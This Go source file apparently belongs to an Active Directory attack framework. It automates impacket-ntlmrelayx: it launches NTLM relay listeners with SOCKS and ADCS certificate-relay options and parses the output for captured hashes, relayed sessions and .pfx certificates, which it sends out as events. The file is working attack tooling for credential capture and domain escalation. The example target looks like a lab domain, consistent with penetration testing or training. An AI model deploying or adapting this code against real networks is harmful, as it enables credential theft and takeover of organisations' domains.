package runtime

import (
	"bufio"
	"context"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"adpack/core"
)

// captureRe extracts user/domain from ntlmrelayx capture lines.
// Patterns:
//
//	"Relayed session from USER@DOMAIN"
//	"Got hash for DOMAIN\USER"
//	"Captured hash for DOMAIN\USER"
//	"USER@DOMAIN authenticated successfully"
var captureRe = regexp.MustCompile(`(?i)(?:from|for)\s+(?:([A-Za-z0-9._-]+)\\)?([A-Za-z0-9._-]+)(?:@([A-Za-z0-9._-]+))?`)

// NTLMRelayConfig carries parameters for an ntlmrelayx listener.
type NTLMRelayConfig struct {
	Target       string         // single target (e.g. ldap://dc01.sevenkingdoms.local)
	InterfaceIP  string         // listening interface IP
	SMBServer    bool           // enable SMB server
	HTTPServer   bool           // enable HTTP server
	SOCKSSupport bool           // enable SOCKS proxy mode
	ADCSMode     bool           // enable ADCS relay mode
	Template     string         // certificate template name (ADCS mode)
	Ports        map[string]int // per-protocol port overrides
	LootDir      string         // directory to store captured material
}

// DefaultNTLMRelayConfig returns a minimal sensible configuration.
func DefaultNTLMRelayConfig(interfaceIP, target string) NTLMRelayConfig {
	return NTLMRelayConfig{
		InterfaceIP:  interfaceIP,
		Target:       target,
		SMBServer:    true,
		HTTPServer:   true,
		SOCKSSupport: false,
		ADCSMode:     false,
		Ports:        make(map[string]int),
	}
}

// startNTLMRelay spawns an impacket-ntlmrelayx process with the given config.
// Returns the cmd, a channel of captured material descriptions, and a stop function.
func startNTLMRelay(ctx context.Context, cfg NTLMRelayConfig) (*exec.Cmd, <-chan string, func() error, error) {
	args := buildNTLMRelayArgs(cfg)

	cmd := exec.CommandContext(ctx, "impacket-ntlmrelayx", args...)

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, nil, nil, err
	}

	if err := cmd.Start(); err != nil {
		return nil, nil, nil, err
	}

	captures := make(chan string, 64)

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer close(captures)
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			line := scanner.Text()
			if isCaptureLine(line) || isCertCaptureLine(line) {
				captures <- line
			}
		}
	}()

	stop := func() error {
		if cmd.Process != nil {
			return cmd.Process.Kill()
		}
		return nil
	}

	go func() {
		cmd.Wait()
		wg.Wait()
	}()

	return cmd, captures, stop, nil
}

// buildNTLMRelayArgs converts config to ntlmrelayx command-line args.
func buildNTLMRelayArgs(cfg NTLMRelayConfig) []string {
	var args []string

	if cfg.Target != "" {
		args = append(args, "-t", cfg.Target)
	}
	if cfg.InterfaceIP != "" {
		args = append(args, "-ip", cfg.InterfaceIP)
	}
	if !cfg.SMBServer {
		args = append(args, "--no-smb-server")
	}
	if !cfg.HTTPServer {
		args = append(args, "--no-http-server")
	}
	if cfg.SOCKSSupport {
		args = append(args, "-socks")
	}
	if cfg.ADCSMode {
		args = append(args, "--adcs")
		if cfg.Template != "" {
			args = append(args, "--template", cfg.Template)
		}
	}
	if cfg.LootDir != "" {
		args = append(args, "-l", cfg.LootDir)
	}
	for proto, p := range cfg.Ports {
		args = append(args, "--"+strings.ToLower(proto)+"-port", fmt.Sprintf("%d", p))
	}

	return args
}

// isCertCaptureLine returns true if the line signals a certificate file capture.
func isCertCaptureLine(line string) bool {
	lower := strings.ToLower(line)
	return strings.Contains(lower, "certificate") &&
		strings.Contains(lower, ".pfx")
}

// isCaptureLine returns true if the line signals a captured hash or relayed session.
func isCaptureLine(line string) bool {
	lower := strings.ToLower(line)
	return strings.Contains(lower, "relayed session from") ||
		strings.Contains(lower, "got hash for") ||
		strings.Contains(lower, "captured hash") ||
		strings.Contains(lower, "authenticated") ||
		(strings.Contains(lower, "successfully") && strings.Contains(lower, "relay"))
}

// NewNTLMRelayService creates a configured ManagedService backed by a real
// ntlmrelayx process. The service emits EvSessionCaptured or EvHashCaptured
// events when material is observed on stdout.
func NewNTLMRelayService(id, label string, cfg NTLMRelayConfig) *core.ManagedService {
	svc := &core.ManagedService{
		ID:    id,
		Type:  core.ServiceNTLMRelay,
		Label: label,
		State: core.ServiceStopped,
		Config: map[string]any{
			"target":    cfg.Target,
			"interface": cfg.InterfaceIP,
			"adcs_mode": cfg.ADCSMode,
			"socks":     cfg.SOCKSSupport,
		},
		ValidUntil: time.Now().Add(4 * time.Hour),
		Events:     make(chan core.ServiceEvent, 64),
	}

	svc.StopFn = func() error {
		// Stored in svc.Config["_cmd"] by the supervisor on start
		return nil
	}

	return svc
}

// StartNTLMRelayService starts a registered NTLM relay service. This is called
// by the supervisor after registration. It stores the *exec.Cmd in the service
// config for clean shutdown. Parent context provides cancellation propagation.
func StartNTLMRelayService(svc *core.ManagedService, cfg NTLMRelayConfig, parentCtx context.Context) error {
	ctx, cancel := context.WithCancel(parentCtx)

	cmd, captures, stop, err := startNTLMRelay(ctx, cfg)
	if err != nil {
		cancel()
		return err
	}

	svc.Config["_cmd"] = cmd
	svc.Config["_cancel"] = cancel
	svc.StopFn = func() error {
		cancel()
		return stop()
	}
	svc.State = core.ServiceRunning
	svc.LastHeartbeat = time.Now()

	go func() {
		for capture := range captures {
			evtType := core.EvSessionCaptured
			if strings.Contains(strings.ToLower(capture), "hash") {
				evtType = core.EvHashCaptured
			}

			data := map[string]any{"raw": capture}
			if m := captureRe.FindStringSubmatch(capture); len(m) > 0 {
				domain := m[1]
				user := m[2]
				if domain == "" {
					domain = m[3]
				}
				data["source_domain"] = strings.ToUpper(domain)
				data["source_user"] = user
			}

			if isCertCaptureLine(capture) {
				svc.Events <- core.ServiceEvent{
					Type:      core.EvArtifactDiscovered,
					ServiceID: svc.ID,
					Service:   core.ServiceNTLMRelay,
					Timestamp: time.Now(),
					Data: map[string]any{
						"artifact_type": "adcs.cert",
						"raw":           capture,
					},
				}
			}

			svc.Events <- core.ServiceEvent{
				Type:      evtType,
				ServiceID: svc.ID,
				Service:   core.ServiceNTLMRelay,
				Timestamp: time.Now(),
				Data:      data,
			}
		}
		svc.State = core.ServiceStopped
	}()

	return nil
}
